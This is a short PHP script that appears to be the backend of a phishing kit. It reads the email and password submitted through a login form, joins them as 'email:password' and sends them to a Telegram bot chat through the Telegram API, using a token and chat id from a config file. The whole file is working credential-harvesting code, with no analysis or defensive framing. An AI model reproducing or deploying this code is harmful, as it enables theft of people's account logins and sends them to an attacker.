<?php
require_once( '../config.php' );

$email = htmlspecialchars( $_POST["Email"] );
$password = htmlspecialchars( $_POST["Password"] );

$result = $email . ':' . $password;
echo $result;

$url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage?chat_id=" . $telegram_id . "&parse_mode=html&text=" . $result . "";
file_get_contents( $url );

?>